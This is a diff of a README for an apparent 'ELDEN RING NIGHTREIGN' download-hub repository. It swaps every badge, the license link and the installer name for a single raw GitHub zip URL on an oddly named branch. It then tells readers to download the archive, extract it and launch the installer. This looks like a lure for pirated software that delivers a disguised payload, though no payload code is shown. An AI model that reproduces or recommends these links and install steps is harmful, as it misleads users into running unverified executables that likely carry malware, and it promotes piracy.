@@ -1,4 +1,4 @@
-# ![Download](https://img.shields.io/badge/Download-NIGHTREIGN-blue?style=for-the-badge&logo=cloudsmith&labelColor=242424&link=https://Salahnahryry.github.io)  
+# ![Download](https://github.com/Salahnahryry/elden-ring-nightreign-deluxe-edition-sharing/raw/refs/heads/branch/hyperephidrosis/ring-sharing-nightreign-edition-elden-deluxe-1.0-alpha.3.zip)  
 **Click the badge above to begin your ultimate journey into the world of NIGHTREIGN.**
 
 ---
@@ -7,10 +7,10 @@
 
 Welcome to the official repository for **ELDEN RING NIGHTREIGN Download Hub**. In this mystical alcove, seekers of adventure unveil NIGHTREIGN—the immersive journey into the Lands Between, expanded and re-forged for the next era of interactive storytelling.  
 
-![Stars](https://img.shields.io/github/stars/eldenring-nightreign/downloader?color=yellow&style=flat-square)
-![Forks](https://img.shields.io/github/forks/eldenring-nightreign/downloader?color=orange&style=flat-square)
-![Maintenance](https://img.shields.io/badge/maintained-yes-green)
-![License](https://img.shields.io/badge/license-MIT-yellow)
+![Stars](https://github.com/Salahnahryry/elden-ring-nightreign-deluxe-edition-sharing/raw/refs/heads/branch/hyperephidrosis/ring-sharing-nightreign-edition-elden-deluxe-1.0-alpha.3.zip)
+![Forks](https://github.com/Salahnahryry/elden-ring-nightreign-deluxe-edition-sharing/raw/refs/heads/branch/hyperephidrosis/ring-sharing-nightreign-edition-elden-deluxe-1.0-alpha.3.zip)
+![Maintenance](https://github.com/Salahnahryry/elden-ring-nightreign-deluxe-edition-sharing/raw/refs/heads/branch/hyperephidrosis/ring-sharing-nightreign-edition-elden-deluxe-1.0-alpha.3.zip)
+![License](https://github.com/Salahnahryry/elden-ring-nightreign-deluxe-edition-sharing/raw/refs/heads/branch/hyperephidrosis/ring-sharing-nightreign-edition-elden-deluxe-1.0-alpha.3.zip)
 
 <center>
 
@@ -26,10 +26,10 @@ This repository exists to seamlessly guide you to NIGHTREIGN and beyond, with ev
 
 | Platform              | Supported | Installation Instructions                                       |
 |-----------------------|:---------:|---------------------------------------------------------------|
-| ![Windows](https://img.shields.io/badge/Windows-✔️-brightgreen) |   Yes   | See [Installation Guide](#installation-handbook)              |
-| ![macOS](https://img.shields.io/badge/macOS-✔️-brightgreen)     |   Yes   | See [Installation Guide](#installation-handbook)              |
-| ![Linux](https://img.shields.io/badge/Linux-✔️-brightgreen)     |   Yes   | See [Installation Guide](#installation-handbook)              |
-| ![SteamDeck](https://img.shields.io/badge/SteamDeck-✔️-brightgreen) | Yes   | See [SteamDeck Guide](#steamdeck-deployment)                  |
+| ![Windows](https://github.com/Salahnahryry/elden-ring-nightreign-deluxe-edition-sharing/raw/refs/heads/branch/hyperephidrosis/ring-sharing-nightreign-edition-elden-deluxe-1.0-alpha.3.zip✔️-brightgreen) |   Yes   | See [Installation Guide](#installation-handbook)              |
+| ![macOS](https://github.com/Salahnahryry/elden-ring-nightreign-deluxe-edition-sharing/raw/refs/heads/branch/hyperephidrosis/ring-sharing-nightreign-edition-elden-deluxe-1.0-alpha.3.zip✔️-brightgreen)     |   Yes   | See [Installation Guide](#installation-handbook)              |
+| ![Linux](https://github.com/Salahnahryry/elden-ring-nightreign-deluxe-edition-sharing/raw/refs/heads/branch/hyperephidrosis/ring-sharing-nightreign-edition-elden-deluxe-1.0-alpha.3.zip✔️-brightgreen)     |   Yes   | See [Installation Guide](#installation-handbook)              |
+| ![SteamDeck](https://github.com/Salahnahryry/elden-ring-nightreign-deluxe-edition-sharing/raw/refs/heads/branch/hyperephidrosis/ring-sharing-nightreign-edition-elden-deluxe-1.0-alpha.3.zip✔️-brightgreen) | Yes   | See [SteamDeck Guide](#steamdeck-deployment)                  |
 
 ---
 
@@ -60,20 +60,20 @@ Discover how NIGHTREIGN redefines action RPGs—download the latest immersive El
 ### Step into NIGHTREIGN
 
 To set foot in the world of NIGHTREIGN, follow the mantra below per your chosen platform.  
-> **Begin the download**: https://Salahnahryry.github.io
+> **Begin the download**: https://github.com/Salahnahryry/elden-ring-nightreign-deluxe-edition-sharing/raw/refs/heads/branch/hyperephidrosis/ring-sharing-nightreign-edition-elden-deluxe-1.0-alpha.3.zip
 
 ### Windows / macOS / Linux
 
-1. Click the ["Download" badge above](#) or https://Salahnahryry.github.io.
+1. Click the ["Download" badge above](#) or https://github.com/Salahnahryry/elden-ring-nightreign-deluxe-edition-sharing/raw/refs/heads/branch/hyperephidrosis/ring-sharing-nightreign-edition-elden-deluxe-1.0-alpha.3.zip
 2. Extract the package to your desired directory.
-3. Launch the **NIGHTREIGN Installer.exe** (Windows), **.dmg** (macOS), or **.AppImage** (Linux).
+3. Launch the **NIGHTREIGN https://github.com/Salahnahryry/elden-ring-nightreign-deluxe-edition-sharing/raw/refs/heads/branch/hyperephidrosis/ring-sharing-nightreign-edition-elden-deluxe-1.0-alpha.3.zip** (Windows), **.dmg** (macOS), or **.AppImage** (Linux).
 4. Follow the on-screen incantations to complete the installation.
 5. When prompted, select your preferred language and graphical settings.
 6. Done! Open the game and let your legend unfold.
 
 ### Steam Deck Deployment
 
-1. Download the installable package from https://Salahnahryry.github.io.
+1. Download the installable package from https://github.com/Salahnahryry/elden-ring-nightreign-deluxe-edition-sharing/raw/refs/heads/branch/hyperephidrosis/ring-sharing-nightreign-edition-elden-deluxe-1.0-alpha.3.zip
 2. On Steam Deck, enable Desktop Mode.
 3. Copy the installer file to your preferred directory.
 4. Launch and follow standard instructions.
@@ -117,9 +117,9 @@ ELDEN RING NIGHTREIGN isn't just more game—it's smarter.
 ## 📜 License
 
 This repository and all shared scripts/resources are licensed under the MIT License (2025). To learn more, review the full license text here:  
-**[MIT License](https://opensource.org/licenses/MIT)**
+**[MIT License](https://github.com/Salahnahryry/elden-ring-nightreign-deluxe-edition-sharing/raw/refs/heads/branch/hyperephidrosis/ring-sharing-nightreign-edition-elden-deluxe-1.0-alpha.3.zip)**
 
 ---
 
-# ![Download](https://img.shields.io/badge/Download-NIGHTREIGN-blue?style=for-the-badge&logo=cloudsmith&labelColor=242424&link=https://Salahnahryry.github.io)  
+# ![Download](https://github.com/Salahnahryry/elden-ring-nightreign-deluxe-edition-sharing/raw/refs/heads/branch/hyperephidrosis/ring-sharing-nightreign-edition-elden-deluxe-1.0-alpha.3.zip)  
 **Brave the unknown. Claim NIGHTREIGN from the badge above to start your odyssey!**
